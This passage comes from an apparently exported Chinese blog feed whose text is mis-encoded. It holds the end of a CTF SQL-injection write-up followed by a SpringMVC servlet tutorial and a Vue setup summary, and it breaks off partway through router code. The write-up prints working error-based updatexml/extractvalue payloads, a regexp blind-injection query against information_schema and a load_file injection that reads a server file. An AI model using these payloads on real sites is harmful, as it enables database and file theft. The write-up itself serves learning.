<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å‰åŠæ®µçš„flagï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#39;:flag&#123;8091937b-0547-42a3-b7b3-41&#39;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯è¿˜æ˜¯ä¸å¤Ÿï¼Œæˆ‘ä»¬åº”è¯¥è·å–å…¨éƒ¨çš„æ•°æ®ï¼Œäºæ˜¯ç»§ç»­æ„é€ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(group_concat(STNAME))from student)),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select reverse((group_concat(STNAME)))from student)),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    11</span><br><span class="line">Current database: webos</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºMarkdownè‡ªåŠ¨çš„å¼±æ™ºä¸å…¨ï¼Œå¯¼è‡´æˆ‘fuzzäº†å·¨ä»–å¦ˆä¹…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br></pre></td></tr></table></figure>

<p><img src="image-20201118221117122.png" alt="image-20201118221117122"></p>
<p>å¾—åˆ°flagï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;8091937b-0547-42a3-b7b3-415a267a6a46&#125;</span><br></pre></td></tr></table></figure>



<h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>è¿™é“é¢˜çš„ä¸éš¾ï¼Œå°±æ˜¯å‡ºé¢˜äººæ¯”è¾ƒé™©æ¶ï¼Œè®©ä½ éœ€è¦æµ‹è¯•å¾ˆä¹…ï¼Œè¿‡æ»¤çš„ä¸œè¥¿ï¼Œä¹Ÿå¾ˆå¤šï¼Œä½†æ˜¯è‡ªå·±è¿˜æ˜¯å­¦åˆ°å¾ˆå¤šä¸œè¥¿çš„ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹regexpï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://dev.mysql.com/doc/refman/5.7/en/regexp.html#operator_regexp</span><br></pre></td></tr></table></figure>

<p>å®˜æ–¹å…è®¸ç”¨æˆ·æŸ¥è¯¢çš„æ—¶å€™ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥è¿”å›æ»¡è¶³çš„ç»“æœï¼Œè‹¥æˆ‘ä»¬å¯¹ä¸€ä¸²å­—ç¬¦ä¸²è¿›è¡ŒæŸ¥è¯¢ï¼Œè‹¥æŸ¥è¯¢æˆåŠŸï¼Œåˆ™ä¼šè¿”å›1ï¼Œå¦åˆ™å°±æ˜¯0</p>
<p><img src="image-20201119122114553.png" alt="image-20201119122114553"></p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè‹¥æˆ‘ä»¬æŸ¥è¯¢çš„æ˜¯ä¸€ä¸ªç»“æœé›†ï¼Œåˆ™ä¼šè¿”å›åŒ¹é…çš„ç›¸åº”æ•°æ®ï¼š</p>
<p><img src="image-20201119122203777.png" alt="image-20201119122203777"></p>
<p>æ€»ç»“ä¸‹æ¥æŸ¥è¯¢çš„ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select [å†…å®¹] from [è¡¨å] where [é™å®šæŸ¥è¯¢ç›®æ ‡ï¼Œåªèƒ½å»åŒ¹é…ä¸€ä¸ªå­—æ®µçš„ç›®æ ‡] REGEXP [&#39;æ­£åˆ™è¡¨è¾¾å¼&#39;];</span><br><span class="line">#ä¾‹å­ï¼š</span><br><span class="line">SELECT * from websites where url REGEXP &#39;goo&#39;;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬çš„æ³¨å…¥è¯­å¥å¯ä»¥ç¼–å†™æˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–åº”è¯¥è¿˜å¯ä»¥åˆ©ç”¨è¯¥è¯­å¥è¿›è¡Œç›²æ³¨ï¼š</p>
<p>é¦–å…ˆæ„é€ ifè¯­å¥ï¼Œifè¯­å¥æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT IF(1&gt;2,2,3);</span><br><span class="line">        -&gt; 3</span><br><span class="line">mysql&gt; SELECT IF(1&lt;2,&#39;yes&#39;,&#39;no&#39;);</span><br><span class="line">        -&gt; &#39;yes&#39;</span><br><span class="line">mysql&gt; SELECT IF(STRCMP(&#39;test&#39;,&#39;test1&#39;),&#39;no&#39;,&#39;yes&#39;);</span><br><span class="line">        -&gt; &#39;no&#39;</span><br><span class="line">#é‚£ä¹ˆæ ¼å¼å¦‚ä¸‹ï¼š</span><br><span class="line">if([åˆ¤æ–­è¡¨è¾¾å¼],[æˆåŠŸçš„ç»“æœ],[å¤±è´¥çš„ç»“æœ]);</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥ä¸­é€šå¸¸ä½¿ç”¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select * from websites where id &#x3D;&#39;1&#39; and if( (1&#x3D;1),0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from websites where id &#x3D;&#39;1&#39; and if( (1&#x3D;1),1,0);</span><br><span class="line">+----+--------+------------------------+-------+---------+</span><br><span class="line">| id | name   | url                    | alexa | country |</span><br><span class="line">+----+--------+------------------------+-------+---------+</span><br><span class="line">|  1 | Google | https:&#x2F;&#x2F;www.google.cm&#x2F; |     1 | USA     |</span><br><span class="line">+----+--------+------------------------+-------+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#é€»è¾‘ç¬¦å·ï¼š</span><br><span class="line">#&amp;&amp; ä¸º andï¼Œ^ ä¸ºxorï¼Œ||ä¸ºæˆ–</span><br></pre></td></tr></table></figure>

<p>æ‹¼å‡‘å‡ºæ¥å¯ä»¥å¾—åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and 1&#x3D;(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA&#x3D;&quot;security&quot; AND table_name REGEXP &#39;^e&#39; LIMIT 0,1) </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé¡ºä¾¿è®°å½•ä¸€ä¸‹load_fileçš„æŠ¥é”™æ³¨å…¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">search.php?keywords=&#x27;and extractvalue(0x7e,concat(0x7e,(mid((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&#x27;ar/wwwml/flag.php&#x27;</span>)),<span class="number">60</span>,<span class="number">80</span>))))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<p>æ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freesion.com&#x2F;article&#x2F;2367234678&#x2F;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMVC</title>
    <url>/2020/11/19/SpringMVC/</url>
    <content><![CDATA[<p>æ³¨å…¥äº†ä¸€å¤©çœŸçš„æ•´çš„äººéƒ½å¤´æ™•çœ¼èŠ±çš„ï¼Œå­¦ä¸€ä¸‹å¼€å‘æ”¾æ¾ä¸€ä¸‹</p>
<h1 id="SpringMVC-01"><a href="#SpringMVC-01" class="headerlink" title="SpringMVC-01"></a>SpringMVC-01</h1><p>æˆ‘ä»¬é¦–å…ˆç¬¬ä¸€æ­¥å…ˆå¤ä¹ Servletå’Œtomcat</p>
<p>æˆ‘ä»¬è€æ ·å­ï¼Œä¸‰å±‚æ¶æ„ï¼Œç„¶åå¯¼å…¥åŒ…ä»€ä¹ˆçš„</p>
<p>ç±»çš„ç»„ç»‡ï¼š</p>
<p><img src="image-20201119205548729.png" alt="image-20201119205548729"></p>
<p>æ³¨æ„è¯·åˆ›å»ºMAVENé¡¹ç›®</p>
<p>ä¹‹åæ˜¯å¯¼åŒ…ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.junit.jupiter/junit-jupiter-api --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-core --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å†ä¹‹åæ˜¯å†™ä»£ç ï¼š</p>
<p>HelloServletï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.gura.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//        è·å–å‰ç«¯å‚æ•°</span></span><br><span class="line">        String method =req.getParameter(<span class="string">&quot;method&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (method.equals(<span class="string">&quot;add&quot;</span>))&#123;</span><br><span class="line">            req.getSession().setAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;æ‰§è¡Œäº†æ·»åŠ æ–¹æ³•&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.equals(<span class="string">&quot;delete&quot;</span>))&#123;</span><br><span class="line">            req.getSession().setAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;æ‰§è¡Œäº†delteæ–¹æ³•&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è°ƒç”¨ä¸šåŠ¡</span></span><br><span class="line"><span class="comment">//    è§†å›¾è½¬å‘æˆ–è€…é‡å®šå‘</span></span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;/WEB-INF/jsp/test.jsp&quot;</span>).forward(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        doGet(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>test.jsp:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: <span class="number">75620</span></span><br><span class="line">  Date: <span class="number">2020</span>/<span class="number">11</span>/<span class="number">19</span></span><br><span class="line">  Time: <span class="number">20</span>:<span class="number">46</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;$&#123;msg&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>web.xml:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.gura.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>15<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå®ç°äº†ä¸€æ¬¡å¯¹æ¥å£çš„å¤„ç†çš„è½¬å‘</p>
<p>æµ‹è¯•ä»£ç æˆåŠŸ</p>
]]></content>
      <tags>
        <tag>å¼€å‘</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Vueæ€»ç»“</title>
    <url>/2020/10/25/Vue%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="Vue-part"><a href="#Vue-part" class="headerlink" title="Vue part"></a>Vue part</h1><p>æ€»ç»“äº†å‰ç«¯é¡¹ç›®çš„æ­å»ºï¼Œä»¥åŠè‡ªå·±åœ¨è¿™æ¬¡ä½œå“ä¸­å­¦åˆ°äº†ä»€ä¹ˆ</p>
<a id="more"></a>

<p>Vueæˆ‘è®¤ä¸ºå­¦ä¸‹æ¥å°±æ˜¯å¾ˆçˆ½ï¼ŒåŸºæœ¬ä¸Šä¸ç”¨å†å„ç§å»ç»‘å®šJSå½“ä¸­çš„domå…ƒç´ äº†ï¼ˆgetElementByIdä»€ä¹ˆçš„ï¼‰</p>
<p>å…¶ä¸­åŸºç¡€æºç ï¼Œæœ‰ä¸€ä¸ªindex.html</p>
<h2 id="1-index-html"><a href="#1-index-html" class="headerlink" title="1.index.html"></a>1.index.html</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">strong</span>&gt;</span>We&#x27;re sorry but <span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span> doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- built files will be auto injected --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨çš„æ—¶å€™æœ‰ä¸€ä¸ªmain.jsï¼ŒAPP.vueç­‰ç­‰ã€‚ç°åœ¨è®²ä¸€ä¸‹æˆ‘æ˜¯æ€ä¹ˆåšä¸‹æ¥çš„ï¼Œæˆ‘åˆ©ç”¨åˆ°çš„æ¡†æ¶æ˜¯antdvï¼Œå†package.jsonå½“ä¸­å¯ä»¥æ‰¾åˆ°</p>
<h2 id="2-package-json"><a href="#2-package-json" class="headerlink" title="2.package.json"></a>2.package.json</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;,</span><br><span class="line">    &quot;@antv/g2&quot;: &quot;^4.0.15&quot;,</span><br><span class="line">    &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;,</span><br><span class="line">    &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;,</span><br><span class="line">    &quot;axios&quot;: &quot;^0.20.0&quot;,</span><br><span class="line">    &quot;core-js&quot;: &quot;^3.6.5&quot;,</span><br><span class="line">    &quot;echarts&quot;: &quot;^4.9.0&quot;,</span><br><span class="line">    &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;,</span><br><span class="line">    &quot;js-cookie&quot;: &quot;^2.2.1&quot;,</span><br><span class="line">    &quot;jspdf&quot;: &quot;^2.1.1&quot;,</span><br><span class="line">    &quot;less&quot;: &quot;^3.12.2&quot;,</span><br><span class="line">    &quot;less-loader&quot;: &quot;^7.0.1&quot;,</span><br><span class="line">    &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;,</span><br><span class="line">    &quot;react&quot;: &quot;^16.13.1&quot;,</span><br><span class="line">    &quot;react-dom&quot;: &quot;^16.13.1&quot;,</span><br><span class="line">    &quot;react-window&quot;: &quot;^1.8.5&quot;,</span><br><span class="line">    &quot;vant&quot;: &quot;^2.10.9&quot;,</span><br><span class="line">    &quot;vue&quot;: &quot;^2.6.11&quot;,</span><br><span class="line">    &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;,</span><br><span class="line">    &quot;vue-router&quot;: &quot;^3.4.5&quot;,</span><br><span class="line">    &quot;vuex&quot;: &quot;^3.5.1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;babel-eslint&quot;: &quot;^10.1.0&quot;,</span><br><span class="line">    &quot;eslint&quot;: &quot;^6.7.2&quot;,</span><br><span class="line">    &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;,</span><br><span class="line">    &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>è¦ç”¨çš„æ—¶å€™å†é¡¹ç›®æ ¹ç›®å½•ä¸‹cnpm -iå³å¯ã€‚</p>
<p>è®²ä¸€ä¸‹è·¯ç”±è¯¥æ€ä¹ˆåšæŠŠï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª</p>
<h2 id="3-router-js"><a href="#3-router-js" class="headerlink" title="3.router.js"></a>3.router.js</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¼•å…¥vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="comment">//å¼•å…¥vue-router</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>åœ¨Vueå½“ä¸­ï¼Œæ‰€æœ‰éœ€è¦å¼•ç”¨çš„ä¸œè¥¿éœ€è¦ç”¨Vue.useä¹‹åæ‰ä¼šç”Ÿæ•ˆ</p>
<p>æ•…æˆ‘ä»¬æ„é€ ä¹‹åçš„ä»£ç æ¡†æ¶å¤§è‡´å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¼•å…¥vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="comment">//å¼•å…¥vue-router</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¼•ç”¨page1é¡µé¢</span></span><br><span class="line"><span class="keyword">import</span> upload  <span class="keyword">from</span> <span class="string">&#x27;./components/upload.vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> login <span class="keyword">from</span> <span class="string">&#x27;./components/login.vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰routesè·¯ç”±çš„é›†åˆï¼Œæ•°ç»„ç±»å‹</span></span><br><span class="line"><span class="keyword">const</span> routes=[</span><br><span class="line">    <span class="comment">//å•ä¸ªè·¯ç”±å‡ä¸ºå¯¹è±¡ç±»å‹ï¼Œpathä»£è¡¨çš„æ˜¯è·¯å¾„ï¼Œcomponentä»£è¡¨ç»„ä»¶</span></span><br><span class="line">    &#123;<span 